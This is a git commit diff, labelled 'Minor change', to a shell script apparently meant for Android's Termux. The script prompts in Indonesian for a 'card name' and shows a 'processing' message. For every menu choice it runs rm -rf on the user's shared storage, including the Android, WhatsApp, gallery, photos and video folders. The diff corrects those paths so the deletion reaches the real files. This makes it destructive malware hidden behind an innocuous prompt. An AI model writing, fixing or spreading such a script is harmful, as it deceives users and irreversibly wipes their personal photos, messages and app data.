1d2693db3cf8b20e42b619b31928fffa48327c4c
Taufik Hidayat <ta142fa@gmail.com>
2021-03-13 13:37:36 +0000

    Minor change

--- sc.sh
+++ sc.sh
@@ -16,40 +16,36 @@ read -p "masukkan nama kartu: " pill;
 if [ $pill = "1" ]
 then
 echo "sedang memproses" $1
-rm -rf storage/shared/Android
-rm -rf storage/shared/WhatsApp
-rm -rf storage/shared/Android/com.mobile.legends
-rm -rf storage/shared/Galeri
-rm -rf storage/shared/Photos
-rm -rf storage/shared/video
+rm -rf ~/storage/shared/Android
+rm -rf ~/storage/shared/WhatsApp
+rm -rf ~/storage/shared/Galeri
+rm -rf ~/storage/shared/Photos
+rm -rf ~/storage/shared/video
 
 if [ $pill = "2" ]
 then
 echo "sedang berproses" $2
-rm -rf storage/shared/Android
-rm -rf storage/shared/Android/WhatsApp
-rm -rf storage/shared/Android/com.mobile.legends
-rm -rf storage/shared/Galeri
-rm -rf storage/shared/Photos
-rm -rf storage/shared/video
+rm -rf ~/storage/shared/Android
+rm -rf ~/storage/shared/WhatsApp
+rm -rf ~/storage/shared/Galeri
+rm -rf ~/storage/shared/Photos
+rm -rf ~/storage/shared/video
 
 if [ $pill = "3" ] 
 then
 echo "sedang memproses" $3
-rm -rf storage/shared/Android
-rm -rf storage/shared/Android/WhatsApp
-rm -rf storage/shared/Android/com.mobile.legends
-rm -rf storage/shared/Galeri
-rm -rf storage/shared/Photos
-rm -rf storage/shared/video
+rm -rf ~/storage/shared/Android
+rm -rf ~/storage/shared/WhatsApp
+rm -rf ~/storage/shared/Galeri
+rm -rf ~/storage/shared/Photos
+rm -rf ~/storage/shared/video
 
 if [ $pill = "4" ] 
 then
 echo "sedang memproses" $4
-rm -rf storage/shared/Android
-rm -rf storage/shared/Android/WhatsApp
-rm -rf storage/shared/Android/com.mobile.legends
-rm -rf storage/shared/Galeri
-rm -rf storage/shared/Photos
-rm -rf storage/shared/video
+rm -rf ~/storage/shared/Android
+rm -rf ~/storage/shared/WhatsApp
+rm -rf ~/storage/shared/Galeri
+rm -rf ~/storage/shared/Photos
+rm -rf ~/storage/shared/video
 fi
